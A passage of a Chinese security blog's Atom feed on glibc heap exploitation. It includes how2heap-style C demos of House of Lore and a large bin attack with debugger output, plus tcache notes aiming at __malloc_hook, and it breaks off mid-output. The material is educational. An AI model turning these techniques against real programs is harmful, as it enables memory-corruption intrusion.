<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Colorlight&#39;s Blog</title>
  
  <subtitle>思维改变生活</subtitle>
  <link href="https://colorlight.github.io/atom.xml" rel="self"/>
  
  <link href="https://colorlight.github.io/"/>
  <updated>2021-06-17T13:27:24.588Z</updated>
  <id>https://colorlight.github.io/</id>
  
  <author>
    <name>Colorlight</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>堆利用系列九：House of Lore</title>
    <link href="https://colorlight.github.io/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%9D%EF%BC%9AHouse-of-Lore/"/>
    <id>https://colorlight.github.io/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%9D%EF%BC%9AHouse-of-Lore/</id>
    <published>2021-06-17T13:23:43.000Z</published>
    <updated>2021-06-17T13:27:24.588Z</updated>
    
    <content type="html"><![CDATA[<h2 id="house-of-lore例程"><a href="#house-of-lore例程" class="headerlink" title="house of lore例程"></a>house of lore例程</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  puts(&quot;So let&apos;s cover House of Lore.&quot;);</span><br><span class="line">  puts(&quot;House of Lore focuses on attacking the small bin to allocate a chunk outside of the heap.&quot;);</span><br><span class="line">  puts(&quot;We will essentially create two fake small bin chunks, then overwrite the bk pointer of the small bin chunk to point to the first chunk.&quot;);</span><br><span class="line">  puts(&quot;Then just allocate chunks until we get a fake chunk.&quot;);</span><br><span class="line">  puts(&quot;It&apos;s sort of like a fast bin attack, however with more setup and restrictions.&quot;);</span><br><span class="line">  puts(&quot;Let&apos;s get started.\n\n&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  printf(&quot;We will start off by grooming the heap so we can do House of Lore.\n&quot;);</span><br><span class="line">  printf(&quot;For that we will need a chunk in the small bin that we can edit with some sort of bug.\n&quot;);</span><br><span class="line">  printf(&quot;For this we will allocate a small bin size chunk (by default on x64 it is greater than 0x80 and less than 0x400).\n\n&quot;);</span><br><span class="line"></span><br><span class="line">  unsigned long *ptr0;</span><br><span class="line">  ptr0 = malloc(0x200);</span><br><span class="line"></span><br><span class="line">  printf(&quot;Allocated chunk at:\t%p\n\n&quot;, ptr0);</span><br><span class="line"></span><br><span class="line">  printf(&quot;Next we will allocate another chunk, just to avoid consolidating our ptr0 chunk with the top chunk.\n\n&quot;);</span><br><span class="line"></span><br><span class="line">  malloc(0x40);</span><br><span class="line"></span><br><span class="line">  printf(&quot;Next up we will insert our first heap chunk into the unsorted bin by freeing it.\n\n&quot;);</span><br><span class="line"></span><br><span class="line">  free(ptr0);</span><br><span class="line"></span><br><span class="line">  printf(&quot;Now we will insert our unsorted bin chunk into the small bin by allocating a heap chunk big enough that it can&apos;t come out of the unsorted bin.\n&quot;);</span><br><span class="line"></span><br><span class="line">  malloc(0x500);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  printf(&quot;Now that we have a chunk in the small bin, we can move on to forging the fake chunks.\n\n&quot;);</span><br><span class="line"></span><br><span class="line">  printf(&quot;The small bin is a doubly linked list, with a fwd and bk pointer.\n&quot;);</span><br><span class="line">  printf(&quot;The chunk that we allocate outside of the heap needs to have a fwd and bk pointer to chunks that their opposite pointers point back to them.\n&quot;);</span><br><span class="line">  printf(&quot;Due to checks made by malloc the fwd chunk&apos;s bk pointer needs to point to the chunk outside of the heap we will allocate with malloc, and vice versa.\n&quot;);</span><br><span class="line">  printf(&quot;So in total we will need three chunks, one of which is our small bin chunk, and the other two will be on the stack.\n&quot;);</span><br><span class="line">  printf(&quot;Our goal is to get malloc to allocate fake chunk 0 (it will be at an offset of 0x10 from the start).\n\n&quot;);</span><br><span class="line"></span><br><span class="line">  unsigned long fake0[4];</span><br><span class="line">  unsigned long fake1[4];</span><br><span class="line"></span><br><span class="line">  printf(&quot;Fake Chunk 0:\t%p\n&quot;, fake0);</span><br><span class="line">  printf(&quot;Fake Chunk 1:\t%p\n\n&quot;, fake1);</span><br><span class="line"></span><br><span class="line">  printf(&quot;Now we will write the pointers that will link our two fake chunks on the stack.\n&quot;);</span><br><span class="line">  printf(&quot;The bk pointer for fake chunk 0 will point to fake chunk 1.\n&quot;);</span><br><span class="line">  printf(&quot;The fwd pointer for fake chunk 1 will point to fake chunk 0.\n&quot;);</span><br><span class="line">  printf(&quot;This is because if a chunk is allocated from the small bin, the next chunk will be the bk chunk.\n&quot;);</span><br><span class="line">  printf(&quot;Also keep in mind, these pointers are to the start of the heap metadata.\n\n&quot;);</span><br><span class="line"></span><br><span class="line">  fake0[3] = (unsigned long)fake1;</span><br><span class="line">  fake1[2] = (unsigned long)fake0;  //这个地方是为了绕过malloc(): smallbin double linked list corrupted</span><br><span class="line"></span><br><span class="line">  printf(&quot;Now we will write the two pointers that will link together fake chunk 0 and our small bin chunk.\n&quot;);</span><br><span class="line">  printf(&quot;This is also where our bug comes in to edit a freed small bin chunk.\n&quot;);</span><br><span class="line">  printf(&quot;We will use the bug to overwrite the bk pointer for the small bin chunk to point to point to fake chunk 0.\n&quot;);</span><br><span class="line">  printf(&quot;Then we will overwrite the fwd chunk of the fake chunk 0 to point to the small bin chunk.\n\n&quot;);</span><br><span class="line"></span><br><span class="line">  ptr0[1]  = (unsigned long)fake0;</span><br><span class="line">  fake0[2] = (unsigned long)((unsigned long *)ptr0 - 2);</span><br><span class="line"></span><br><span class="line">  printf(&quot;small bin bk:\t\t0x%lx\n&quot;, ptr0[1]);</span><br><span class="line">  printf(&quot;fake chunk 0 fwd:\t0x%lx\n&quot;, fake0[2]);</span><br><span class="line">  printf(&quot;fake chunk 0 bk:\t0x%lx\n&quot;, fake0[3]);</span><br><span class="line">  printf(&quot;fake chunk 1 fwd:\t0x%lx\n\n&quot;, fake1[2]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  printf(&quot;Now that our setup is out of the way, let&apos;s have malloc allocate fake chunk 0.\n&quot;);</span><br><span class="line">  printf(&quot;We will allocate a heap chunk equal to the size of our small bin chunk.\n&quot;);</span><br><span class="line">  printf(&quot;This will allocate our small bin chunk, and move our fake chunk to the top of the small bin.\n&quot;);</span><br><span class="line">  printf(&quot;Then with another allocation we will get our fake chunk from malloc.\n\n&quot;);</span><br><span class="line"></span><br><span class="line">  printf(&quot;Allocation 0:\t%p\n&quot;, malloc(0x200));   // b1</span><br><span class="line">  printf(&quot;Allocation 1:\t%p\n&quot;, malloc(0x200));   // b2</span><br><span class="line"></span><br><span class="line">  printf(&quot;\nJust like that, we executed a House of Lore attack!\n&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过下图了解glibc到底改变了哪些指针<br><img src="/images/heap_exp/2021-06-15-11-33-57.png" alt></p><p>1.黑色箭头为0x210的chunk刚放到small bin的双向链表上的情况，此时small bin的fd bk指针都指向这个0x210chunk，该chunk的fd，bk指针也都指向small bin。  </p><p>2.红色箭头是使用一些漏洞对已经释放的chunk进行操作，让它的bk指针指向我们能够控制的fake0，对fake0和fake1的操作都是为了规避glibc对small bin双向链表的校验，假设victim这个chunk已经存放在了small bin上了，如果vicitim正好满足一个新的请求，glibc会去校验vicitim的后面一个chunk的fd指针，校验它是不是指向vicitim，如果不满足则直接报错崩溃。<br><code>fake0[2] = (unsigned long)((unsigned long *)ptr0 - 2);</code>这条是为了满足后面一次malloc的校验，<code>fake0[3] = (unsigned long)fake1;fake1[2] = (unsigned long)fake0;</code>这两条是为了满足后面第二次malloc的校验。</p><p>3.绿色的箭头是b1处malloc后的指针情况，当从small bin的链表上取chunk的时候，是从尾部取出chunk，然后修改两个指针。</p><p>4.紫色箭头是b2处的malloc后的指针情况，同样要修改两个指针。</p><p>思考一下应用条件，需要有能力修改一个已经释放到small bin上的chunk，需要有能力控制一块内存区域去构造两个虚假的chunk。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;house-of-lore例程&quot;&gt;&lt;a href=&quot;#house-of-lore例程&quot; class=&quot;headerlink&quot; title=&quot;house of lore例程&quot;&gt;&lt;/a&gt;house of lore例程&lt;/h2&gt;&lt;figure class=&quot;highli</summary>
      
    
    
    
    <category term="堆利用" scheme="https://colorlight.github.io/categories/%E5%A0%86%E5%88%A9%E7%94%A8/"/>
    
    
    <category term="堆利用" scheme="https://colorlight.github.io/tags/%E5%A0%86%E5%88%A9%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>堆利用系列八：House of Spirit</title>
    <link href="https://colorlight.github.io/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E5%85%AB%EF%BC%9A%C2%96House-of-Spirit/"/>
    <id>https://colorlight.github.io/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E5%85%AB%EF%BC%9A%C2%96House-of-Spirit/</id>
    <published>2021-06-17T13:21:36.000Z</published>
    <updated>2021-06-17T13:27:27.977Z</updated>
    
    <content type="html"><![CDATA[<h2 id="等待安全客发表"><a href="#等待安全客发表" class="headerlink" title="等待安全客发表"></a>等待安全客发表</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;等待安全客发表&quot;&gt;&lt;a href=&quot;#等待安全客发表&quot; class=&quot;headerlink&quot; title=&quot;等待安全客发表&quot;&gt;&lt;/a&gt;等待安全客发表&lt;/h2&gt;</summary>
      
    
    
    
    <category term="堆利用" scheme="https://colorlight.github.io/categories/%E5%A0%86%E5%88%A9%E7%94%A8/"/>
    
    
    <category term="堆利用" scheme="https://colorlight.github.io/tags/%E5%A0%86%E5%88%A9%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>堆利用系列七：Tcache Attack </title>
    <link href="https://colorlight.github.io/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B8%83%EF%BC%9ATcache-Attack/"/>
    <id>https://colorlight.github.io/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B8%83%EF%BC%9ATcache-Attack/</id>
    <published>2021-06-17T13:17:34.000Z</published>
    <updated>2021-06-17T13:26:58.799Z</updated>
    
    <content type="html"><![CDATA[<h2 id="malloc中tcache的分配优先级"><a href="#malloc中tcache的分配优先级" class="headerlink" title="malloc中tcache的分配优先级"></a>malloc中tcache的分配优先级</h2><ol><li>先看是不是符合fastbin，如果符合看tcache是否有符合的，如果有则优先从tcache中分配</li><li>看smallbin中是否又能够满足的，也是优先看tcache是否符合，如果符合则从tcache中分配，如果没有满足的才从smallbin中分配</li></ol><h3 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h3><p>可以导致溢出一个字节，但是这个字节不能为NULL</p><h3 id="我一开始的思路"><a href="#我一开始的思路" class="headerlink" title="我一开始的思路"></a>我一开始的思路</h3><ol><li>通过一些布局实现对一个字节的溢出，导致融合错误，导致一个大的chunk放到了unsorted bin上了，然后通过malloc一个tcache上没有的chunk把这个unsroted bin上的chunk给分割掉，同时有一部分已经可以覆盖了tcache上的chunk，那么写入这个chunk就可以修改tcache了。<br><img src="/images/heap_exp/2021-06-08-21-02-17.png" alt></li><li>但是这个思路貌似卡在了一个字节溢出这个地方，我溢出这个字节不能是NULL，根据题目的原因，然后我尝试用\x02和\x04以及\x08去尝试，发现都会导致程序崩溃，所以这条路就没有走通，但是如果允许溢出 NULL字节的话，我觉着这个思路还是没有问题的</li></ol><h3 id="第二个思路"><a href="#第二个思路" class="headerlink" title="第二个思路"></a>第二个思路</h3><ol><li><p>通过单字节溢出，把0x100的chunk改为0x180的chunk，那么就可以继续通过malloc 0x180 得到一个大的chunk，但是实际上已经覆盖了对下面已经在tcache上的chunk的控制了<br><img src="/images/heap_exp/2021-06-08-21-48-17.png" alt></p></li><li><p>貌似第二个是简单易行的方法，首先得到malloc_hook的地址<code>0x7ffff7dcfc30 &lt;__malloc_hook&gt;: 0x0000000000000000</code>，这个地址是没有\x00的，所以还是比较容易写入的。</p></li><li>现在一个问题是如何得到泄露地址，貌似这个打印是根据\x00截止的，如果没有遇到\x00打印就不会终结。</li></ol><h2 id="手稿图"><a href="#手稿图" class="headerlink" title="手稿图"></a>手稿图</h2><p><img src="/images/heap_exp/2021-06-10-20-38-28.png" alt></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;malloc中tcache的分配优先级&quot;&gt;&lt;a href=&quot;#malloc中tcache的分配优先级&quot; class=&quot;headerlink&quot; title=&quot;malloc中tcache的分配优先级&quot;&gt;&lt;/a&gt;malloc中tcache的分配优先级&lt;/h2&gt;&lt;ol&gt;
</summary>
      
    
    
    
    <category term="堆利用" scheme="https://colorlight.github.io/categories/%E5%A0%86%E5%88%A9%E7%94%A8/"/>
    
    
    <category term="堆利用" scheme="https://colorlight.github.io/tags/%E5%A0%86%E5%88%A9%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>堆利用系列六：Large Bin Attack </title>
    <link href="https://colorlight.github.io/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8BLarge-Bin-Attack/"/>
    <id>https://colorlight.github.io/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8BLarge-Bin-Attack/</id>
    <published>2021-06-17T13:11:29.000Z</published>
    <updated>2021-06-17T13:27:07.372Z</updated>
    
    <content type="html"><![CDATA[<h3 id="large-bin-attack的作用"><a href="#large-bin-attack的作用" class="headerlink" title="large bin attack的作用"></a>large bin attack的作用</h3><p>例程1的作用就是任意地址写，但是写的内容不可控，所以只能用来修改global_max_fast这种作为一种中间步骤。</p><h3 id="large-bin-attack-例程1"><a href="#large-bin-attack-例程1" class="headerlink" title="large bin attack 例程1"></a>large bin attack 例程1</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">// This is based off of Shellphish&apos;s how2heap: https://github.com/shellphish/how2heap/blob/master/glibc_2.26/large_bin_attack.c</span><br><span class="line"></span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">    puts(&quot;This will be covering large bin attacks.&quot;);</span><br><span class="line">    puts(&quot;They are similar to unsorted bin attacks, with that they let us write a pointer.&quot;);</span><br><span class="line">    puts(&quot;However like unsorted bin attacks, we can control where the pointer is written to, but not the value of the pointer.&quot;);</span><br><span class="line">    puts(&quot;Let&apos;s get started.\n&quot;);</span><br><span class="line"></span><br><span class="line">    unsigned long target = 0xdeadbeef;</span><br><span class="line"></span><br><span class="line">    printf(&quot;Our goal will be to overwrite the target variable.\n&quot;);</span><br><span class="line">    printf(&quot;Target address:\t%p\n&quot;, &amp;target);</span><br><span class="line">    printf(&quot;Target value:\t0x%lx\n\n&quot;, target);</span><br><span class="line"></span><br><span class="line">    printf(&quot;We will start off by allocating six chunks.\n&quot;);</span><br><span class="line">    printf(&quot;Three of them will be big enough to go into the small/large bins.\n&quot;);</span><br><span class="line">    printf(&quot;The other three chunks will be fastbin size, to prevent consolidation between the large bin size chunks.\n&quot;);</span><br><span class="line"></span><br><span class="line">    unsigned long *ptr0, *ptr1, *ptr2;</span><br><span class="line">    unsigned long *fpt0, *fpt1, *fpt2;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    ptr0 = malloc(0x200);</span><br><span class="line">    fpt0 = malloc(0x10);</span><br><span class="line"></span><br><span class="line">    ptr1 = malloc(0x500);</span><br><span class="line">    fpt1 = malloc(0x10);</span><br><span class="line">    </span><br><span class="line">    ptr2 = malloc(0x500);</span><br><span class="line">    fpt2 = malloc(0x10);</span><br><span class="line"></span><br><span class="line">    printf(&quot;Now we have allocated our chunks.\n&quot;);</span><br><span class="line">    </span><br><span class="line">    printf(&quot;Large Chunk0:\t%p\n&quot;, ptr0);</span><br><span class="line">    printf(&quot;Large Chunk1:\t%p\n&quot;, ptr1);</span><br><span class="line">    printf(&quot;Large Chunk2:\t%p\n&quot;, ptr2);</span><br><span class="line"></span><br><span class="line">    printf(&quot;Small Chunk0:\t%p\n&quot;, fpt0);</span><br><span class="line">    printf(&quot;Small Chunk1:\t%p\n&quot;, fpt1);</span><br><span class="line">    printf(&quot;Small Chunk2:\t%p\n\n&quot;, fpt2);</span><br><span class="line"></span><br><span class="line">    printf(&quot;Now we will free the first two large chunks.\n\n&quot;);</span><br><span class="line"></span><br><span class="line">    free(ptr0);</span><br><span class="line">    free(ptr1);</span><br><span class="line"></span><br><span class="line">    printf(&quot;Now they are both in the unsorted bin.\n&quot;);</span><br><span class="line">    printf(&quot;Since large bin sized chunks are inserted into the unsorted bin, before being moved to the large bin for potential reuse before they are thrown into that bin.\n&quot;);</span><br><span class="line">    printf(&quot;We will now allocate a fastbin sized chunk. This will move our second (larger) chunk into the large bin (since it is the larger chunk in the unsorted bin).\n&quot;);</span><br><span class="line">    printf(&quot;The first (smaller) chunk will have part of it&apos;s space used for the allocation, and then the remaining chunk will be inserted into the unsorted bin.\n\n&quot;);</span><br><span class="line"></span><br><span class="line">    malloc(0x10);  //--------------------&gt;b1</span><br><span class="line"></span><br><span class="line">    printf(&quot;Next up we will insert the third large chunk into the unsorted bin by freeing it.\n\n&quot;);</span><br><span class="line"></span><br><span class="line">    free(ptr2);   //---------------------&gt;b2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    printf(&quot;Now here is where the bug comes in.\n&quot;);  //-------------------------&gt;b3</span><br><span class="line">    printf(&quot;We will need a bug that will allow us to edit the second chunk (the one that is in the unsorted bin).\n&quot;);</span><br><span class="line">    printf(&quot;Like with the unsorted bin attack, the bk pointer controls where our write goes to.\n&quot;);</span><br><span class="line">    printf(&quot;We will also need to zero out the fwd pointer.\n&quot;);</span><br><span class="line"></span><br><span class="line">    ptr1[0] = 0;</span><br><span class="line">    ptr1[1] = (unsigned long)((&amp;target) - 0x2);</span><br><span class="line"></span><br><span class="line">    printf(&quot;We will also need to overwrite it&apos;s size values with a smaller value.\n\n&quot;);</span><br><span class="line"></span><br><span class="line">    ptr1[-1] = 0x300;</span><br><span class="line"></span><br><span class="line">    printf(&quot;Proceeding that we will allocate another small chunk.\n&quot;);</span><br><span class="line"></span><br><span class="line">    printf(&quot;The larger chunk (third chunk) in the unsorted bin will be inserted into the large bin.\n&quot;);</span><br><span class="line">    printf(&quot;However since the large bin is organized by size, the biggest chunk has to be first.\n&quot;);</span><br><span class="line">    printf(&quot;Since we overwrote the size of the second chunk with a smaller size, the third chunk will move up and become the front of the large bin.\n&quot;);</span><br><span class="line">    printf(&quot;This is where our write happens.\n\n&quot;);</span><br><span class="line"></span><br><span class="line">    malloc(0x10);  //-------------------------&gt;b4</span><br><span class="line"></span><br><span class="line">    printf(&quot;With that, we can see that the value of the target is:\n&quot;);  //----------------------&gt;b5</span><br><span class="line">    printf(&quot;Target value:\t0x%lx\n&quot;, target);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在b1地方下断点，观察内存情况<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">───────────────────────────── Unsorted Bin for arena &apos;*0x7ffff7dd1b20&apos; ─────────────────────────────</span><br><span class="line">[+] unsorted_bins[0]: fw=0x555555758640, bk=0x555555758410</span><br><span class="line"> →   Chunk(addr=0x555555758650, size=0x510, flags=PREV_INUSE)   →   Chunk(addr=0x555555758420, size=0x210, flags=PREV_INUSE)</span><br></pre></td></tr></table></figure></p><p>由于free的时候，会把不是fastbin的chunk放到unsorted bin上，所以这个时候会有两个chunk在unsorted bin上。 </p><p>在malloc(0x10)之后，会导致0x510的chunk被会回收到了large bin上，同时也会把0x210的chunk回收到smallbin上，但是由于申请的空间0x10+0x10是小于large bin的大小的，因此还是会从small bin chunk上找空间，就又从这个0x210的small chunk上分走了0x20大小的chunk，然后剩下的chunk被放入到了unsorted bin上。对应的源码为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">static void *</span><br><span class="line">_int_malloc (mstate av, size_t bytes)</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">        while ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av)) </span><br><span class="line">        &#123;</span><br><span class="line">            bck = victim-&gt;bk;</span><br><span class="line">            ...</span><br><span class="line"></span><br><span class="line">            unsorted_chunks (av)-&gt;bk = bck;    //一定会把chunk从unsorted bin上给删去的</span><br><span class="line">            bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line">            ...</span><br><span class="line"></span><br><span class="line">            mark_bin (av, victim_index);</span><br><span class="line">            victim-&gt;bk = bck;</span><br><span class="line">            victim-&gt;fd = fwd;</span><br><span class="line">            fwd-&gt;bk = victim;</span><br><span class="line">            bck-&gt;fd = victim;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">         if (!in_smallbin_range (nb))&#123;</span><br><span class="line">             ....  // 如果申请的大小是large chunk，则从large bin中返回chunk给用户</span><br><span class="line">             return p;</span><br><span class="line">         &#125;</span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">        //走到这里就已经是说明申请的大小是小于large bin chunk的了</span><br><span class="line"></span><br><span class="line">         remainder = chunk_at_offset (victim, nb);</span><br><span class="line"></span><br><span class="line">        /* We cannot assume the unsorted list is empty and therefore</span><br><span class="line">            have to perform a complete insert here.  */</span><br><span class="line">        bck = unsorted_chunks (av);     // 把从smallbin中分割剩下的remainder放到unsorted bin上。</span><br><span class="line">        fwd = bck-&gt;fd;</span><br><span class="line">        if (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">        &#123;</span><br><span class="line">            errstr = &quot;malloc(): corrupted unsorted chunks 2&quot;;</span><br><span class="line">            goto errout;</span><br><span class="line">        &#125;</span><br><span class="line">        remainder-&gt;bk = bck;</span><br><span class="line">        remainder-&gt;fd = fwd;</span><br><span class="line">        bck-&gt;fd = remainder;</span><br><span class="line">        fwd-&gt;bk = remainder;</span><br></pre></td></tr></table></figure></p><p>观察b2断点处的情况<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">───────────────────────────── Unsorted Bin for arena &apos;*0x7ffff7dd1b20&apos; ─────────────────────────────</span><br><span class="line">[+] unsorted_bins[0]: fw=0x555555758430, bk=0x555555758430</span><br><span class="line"> →   Chunk(addr=0x555555758440, size=0x1f0, flags=PREV_INUSE)</span><br><span class="line">[+] Found 1 chunks in unsorted bin.</span><br><span class="line">────────────────────────────── Small Bins for arena &apos;*0x7ffff7dd1b20&apos; ──────────────────────────────</span><br><span class="line">[+] Found 0 chunks in 0 small non-empty bins.</span><br><span class="line">────────────────────────────── Large Bins for arena &apos;*0x7ffff7dd1b20&apos; ──────────────────────────────</span><br><span class="line">[+] large_bins[67]: fw=0x555555758640, bk=0x555555758640</span><br><span class="line"> →   Chunk(addr=0x555555758650, size=0x510, flags=PREV_INUSE)</span><br></pre></td></tr></table></figure></p><p>unsorted bin上就是从0x210的分下来的。</p><p>观察b3断点的情况<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[+] unsorted_bins[0]: fw=0x555555758b70, bk=0x555555758430</span><br><span class="line"> →   Chunk(addr=0x555555758b80, size=0x510, flags=PREV_INUSE)   →   Chunk(addr=0x555555758440, size=0x1f0, flags=PREV_INUSE)</span><br><span class="line">[+] Found 2 chunks in unsorted bin.</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────── Small Bins for arena &apos;*0x7ffff7dd1b20&apos; ──────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">[+] Found 0 chunks in 0 small non-empty bins.</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────── Large Bins for arena &apos;*0x7ffff7dd1b20&apos; ──────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">[+] large_bins[67]: fw=0x555555758640, bk=0x555555758640</span><br><span class="line"> →   